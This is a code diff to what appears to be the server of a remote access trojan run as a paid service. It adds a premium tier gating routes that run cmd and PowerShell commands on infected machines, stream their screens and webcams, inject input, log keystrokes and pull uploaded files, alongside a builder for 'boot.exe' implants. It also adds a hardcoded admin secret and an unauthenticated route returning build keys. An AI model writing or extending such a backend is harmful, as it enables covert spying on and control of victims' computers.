@@ -147,6 +147,14 @@ function requireAuth(req, res, next) {
   catch { return res.status(401).json({ error: 'unauthorized' }); }
 }
 
+function requirePremium(req, res, next) {
+  const row = getOwnUser(req.user.uid);
+  if (!row || row.premium !== 1) {
+    return res.status(403).json({ error: 'Premium required. Please upgrade your account.' });
+  }
+  next();
+}
+
 const isDiscordWebhook = (url) => typeof url === 'string' &&
   /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
 
@@ -164,7 +172,7 @@ async function sendWebhook(url, payload) {
 }
 
 const getOwnUser = (uid) => db.prepare(sql`
-  SELECT id, username, email, account_key, login_token, discord_webhook, created_at
+  SELECT id, username, email, account_key, login_token, discord_webhook, created_at, premium
   FROM users WHERE id = ?
 `).get(uid);
 
@@ -203,6 +211,14 @@ app.get('/api/health', (_req, res) => {
   res.json({ ok: true, uptime: Math.round(process.uptime()),
              http: CFG.httpPort, tcp: CFG.tcpPort, udp: CFG.udpPort,
              time: new Date().toISOString() });
+});
+
+// DYNAMIC KEY FETCH ROUTE
+app.get('/api/getkey/:buildId', (req, res) => {
+  const buildId = Number(req.params.buildId);
+  const row = db.prepare(sql`SELECT key FROM builds WHERE id = ?`).get(buildId);
+  if (!row) return res.status(404).send('{"error": "not found"}');
+  res.send(`{"key": "${row.key}"}`);
 });
 
 app.post('/api/signup', limitAuth, async (req, res) => {
@@ -297,6 +313,7 @@ app.get('/api/me', requireAuth, (req, res) => {
     loginToken: row.login_token,
     discordWebhook: row.discord_webhook,
     createdAt: row.created_at,
+    premium: row.premium
   });
 });
 
@@ -376,7 +393,7 @@ app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
+app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, (req, res) => {
   const uploadId = Number(req.params.id);
   const row = db.prepare(sql`
     SELECT filename, stored_name, size FROM uploads
@@ -391,7 +408,7 @@ app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
   fs.createReadStream(src).pipe(res);
 });
 
-app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
+app.post('/api/clients/:id/exec', requireAuth, requirePremium, (req, res) => {
   const clientId = Number(req.params.id);
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell', 'file'].includes(shell))
@@ -421,7 +438,7 @@ app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-app.get('/api/clients/:id/sysinfo', requireAuth, async (req, res) => {
+app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
   const clientId = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -468,7 +485,6 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 
   const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
   
-  // Check if missing OR older than 6 hours
   let needsBuild = !fs.existsSync(bootPath);
   if (!needsBuild) {
     const stat = fs.statSync(bootPath);
@@ -483,7 +499,10 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     if (!acctKey) return res.status(400).json({ error: 'no account key to build boot.exe' });
 
     try {
-      const bootBuf = await buildBoot({ key: acctKey });
+      const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
+      const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+
+      const bootBuf = await buildBoot({ key: acctKey, buildId: nextBuildId });
       fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
       fs.renameSync(bootPath + '.tmp', bootPath);
     } catch (e) {
@@ -508,7 +527,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   res.json({ ok: true, commandId: Number(info.lastInsertRowid), bytes: line.length });
 });
 
-app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
+app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -528,7 +547,7 @@ app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
+app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -539,7 +558,7 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/rdp/update', requireAuth, (req, res) => {
+app.post('/api/clients/:id/rdp/update', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -547,14 +566,13 @@ app.post('/api/clients/:id/rdp/update', requireAuth, (req, res) => {
   res.json({ ok });
 });
 
-app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
+app.get('/api/clients/:id/screen', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
   const bytes = getFrame(cid);
   if (!bytes) return res.status(204).end();
 
-  // Detect if it's WebP or JPEG
   let ctype = 'application/octet-stream';
   if (bytes.length >= 12 &&
       bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
@@ -571,14 +589,7 @@ app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
   res.send(bytes);
 });
 
-app.get('/api/getkey/:buildId', (req, res) => {
-  const buildId = Number(req.params.buildId);
-  const row = db.prepare(sql`SELECT key FROM builds WHERE id = ?`).get(buildId);
-  if (!row) return res.status(404).send('{"error": "not found"}');
-  res.send(`{"key": "${row.key}"}`);
-});
-
-app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
+app.get('/api/clients/:id/cursor', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -592,14 +603,14 @@ app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
   res.json(c);
 });
 
-app.get('/api/clients/:id/monitors', requireAuth, (req, res) => {
+app.get('/api/clients/:id/monitors', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
   res.json(getMonitors(cid));
 });
 
-app.post('/api/clients/:id/input', requireAuth, (req, res) => {
+app.post('/api/clients/:id/input', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -607,7 +618,7 @@ app.post('/api/clients/:id/input', requireAuth, (req, res) => {
   res.json({ ok });
 });
 
-app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
+app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -625,7 +636,7 @@ app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/webcam/stop', requireAuth, (req, res) => {
+app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -636,7 +647,7 @@ app.post('/api/clients/:id/webcam/stop', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
+app.get('/api/clients/:id/webcam', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -657,7 +668,7 @@ app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
   res.send(bytes);
 });
 
-app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
+app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -668,7 +679,7 @@ app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/keylog/stop', requireAuth, (req, res) => {
+app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -679,7 +690,7 @@ app.post('/api/clients/:id/keylog/stop', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/api/clients/:id/keylog', requireAuth, (req, res) => {
+app.get('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -691,7 +702,7 @@ app.get('/api/clients/:id/keylog', requireAuth, (req, res) => {
   res.json(rows.reverse());
 });
 
-app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
+app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
@@ -764,7 +775,10 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
   let bootBuf;
   try {
-    bootBuf = await buildBoot({ key: buildKey });
+    const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
+    const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+
+    bootBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
   } catch (e) {
     console.error('[build] cargo failed:', e);
     const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
@@ -825,13 +839,29 @@ app.delete('/api/builds/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
+// SECRET ADMIN ROUTE
+app.post('/api/admin/premium', (req, res) => {
+  const { key, secret } = req.body || {};
+  
+  if (secret !== "super_secret_admin_2026") {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  
+  if (!key) return res.status(400).json({ error: 'key required' });
+  
+  const info = db.prepare(sql`UPDATE users SET premium = 1 WHERE account_key = ?`).run(key);
+  if (info.changes === 0) return res.status(404).json({ error: 'Key not found' });
+  
+  res.json({ ok: true, message: 'Premium activated for ' + key });
+});
+
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
 
 // ---------- auto builder (every 6 hours) ----------
-const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000; // check every hour
-const MAX_AGE_MS = 6 * 60 * 60 * 1000; // rebuild if older than 6h
+const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000;
+const MAX_AGE_MS = 6 * 60 * 60 * 1000;
 
 async function checkAutoBuild() {
   try {
@@ -848,12 +878,15 @@ async function checkAutoBuild() {
     }
 
     if (needsBuild) {
-      // Use the first user's account key to bake into the global boot.exe
       const user = db.prepare(sql`SELECT account_key FROM users WHERE account_key IS NOT NULL LIMIT 1`).get();
-      if (!user) return; // no users registered yet
+      if (!user) return;
 
       console.log(`[auto-build] rebuilding boot.exe (older than 6h or missing)...`);
-      const bootBuf = await buildBoot({ key: user.account_key });
+      
+      const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
+      const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+
+      const bootBuf = await buildBoot({ key: user.account_key, buildId: nextBuildId });
       fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
       fs.renameSync(bootPath + '.tmp', bootPath);
       console.log(`[auto-build] rebuild complete. size: ${bootBuf.length}`);
@@ -864,7 +897,7 @@ async function checkAutoBuild() {
 }
 
 setInterval(checkAutoBuild, AUTO_BUILD_INTERVAL_MS);
-setTimeout(checkAutoBuild, 10_000); // Also run 10 seconds after startup
+setTimeout(checkAutoBuild, 10_000);
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
